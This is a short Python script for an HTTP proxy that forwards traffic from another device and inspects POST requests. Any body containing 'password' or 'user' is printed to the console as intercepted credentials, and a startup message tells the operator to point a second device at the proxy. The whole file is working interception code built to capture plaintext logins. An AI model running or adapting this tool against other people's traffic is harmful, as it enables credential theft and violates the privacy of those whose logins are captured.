import socket
import threading


LISTENING_IP = "0.0.0.0"
LISTENING_PORT = 8080
BUFFER_SIZE = 4096


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(("10.254.254.254", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP


def handle_client(client_socket):
    request = client_socket.recv(BUFFER_SIZE)

    try:
        first_line = request.split(b"\n")[0]
        url = first_line.split(b" ")[1]

        http_pos = url.find(b"://")
        if http_pos == -1:
            temp = url
        else:
            temp = url[(http_pos + 3) :]

        port_pos = temp.find(b":")
        webserver_pos = temp.find(b"/")

        if webserver_pos == -1:
            webserver_pos = len(temp)

        webserver = ""
        port = -1

        if port_pos == -1 or webserver_pos < port_pos:
            port = 80
            webserver = temp[:webserver_pos]
        else:
            port = int((temp[(port_pos + 1) :])[: webserver_pos - port_pos - 1])
            webserver = temp[:port_pos]

        decoded_request = request.decode("utf-8", errors="ignore")

        if "POST" in decoded_request:
            print(f"\n[+] INTERCEPTED POST REQUEST TO: {webserver.decode('utf-8')}")

            if (
                "password" in decoded_request.lower()
                or "user" in decoded_request.lower()
            ):
                print(f"    [!] CREDENTIALS FOUND IN BODY:")

                body = decoded_request.split("\r\n\r\n")[-1]
                print(f"    {body}")
                print("-" * 50)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((webserver, port))
        s.send(request)

        while True:
            data = s.recv(BUFFER_SIZE)
            if len(data) > 0:
                client_socket.send(data)
            else:
                break
        s.close()
        client_socket.close()

    except Exception as e:
        pass


def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTENING_IP, LISTENING_PORT))
    server.listen(5)

    print(
        f"[*] Proxy Server Started, listening on {LISTENING_IP}:{LISTENING_PORT} (everywhere)"
    )
    print(
        f"""[*] But local IP Address is {get_ip()}:{LISTENING_PORT}
so Configure your second device to connect to that as an HTTP Proxy
        """
    )

    while True:
        client_socket, addr = server.accept()

        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_proxy()
